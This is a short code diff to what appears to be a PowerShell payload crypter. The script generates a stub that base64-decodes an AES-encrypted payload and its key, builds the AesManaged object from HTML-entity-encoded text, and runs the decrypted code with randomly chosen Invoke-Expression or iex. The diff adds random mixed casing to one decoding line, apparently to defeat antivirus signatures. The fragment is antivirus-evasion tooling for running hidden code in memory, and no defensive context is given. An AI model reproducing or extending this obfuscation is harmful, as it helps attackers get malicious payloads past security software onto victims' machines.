@@ -163,7 +163,7 @@ sleep 1
             $code_alternatives += '${2} = [coNVeRT]::fROmbASE64sTRINg("{0}")' + "`r`n"       			
 		   $code_alternatives += '${2} = [coNVeRT]::fROmbASE64sTRINg("{0}")' + "`r`n"
             $code_alternatives += '${3} = [coNVeRT]::fRomBaSE64sTRINg("{1}")' + "`r`n"
-            $code_alternatives += '${4} = [System.Net.WebUtility]::HtmlDecode("&#x4e;&#x65;&#x77;&#x2d;&#x4f;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x20;&#x22;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x2e;&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x2e;&#x43;&#x72;&#x79;&#x70;&#x74;&#x6f;&#x67;&#x72;&#x61;&#x70;&#x68;&#x79;&#x2e;&#x41;&#x65;&#x73;&#x4d;&#x61;&#x6e;&#x61;&#x67;&#x65;&#x64;&#x22;") | iex' + "`r`n"
+            $code_alternatives += '${4} = [SyStEm.NEt.WebUtIlIty]::HTmlDecOdE("&#x4e;&#x65;&#x77;&#x2d;&#x4f;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x20;&#x22;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x2e;&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x2e;&#x43;&#x72;&#x79;&#x70;&#x74;&#x6f;&#x67;&#x72;&#x61;&#x70;&#x68;&#x79;&#x2e;&#x41;&#x65;&#x73;&#x4d;&#x61;&#x6e;&#x61;&#x67;&#x65;&#x64;&#x22;") | iex' + "`r`n"
             $code_alternatives_shuffled = $code_alternatives 
             $stub_template += $code_alternatives_shuffled -join ''
            
@@ -199,7 +199,7 @@ sleep 1
             $stub_template += ('INVoke-ExPREsSion','IeX' | Get-Random)+'(${8})' + "`r`n"
             
         
-            # it's ugly, but it beats concatenating each value manually.
+            # Concatenating each value manually.
             $code = $stub_template -f $b64encrypted, $b64key, (Create-Var), (Create-Var), (RAND), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var)
             $codebytes = [System.Text.Encoding]::UTF8.GetBytes($code)
         }
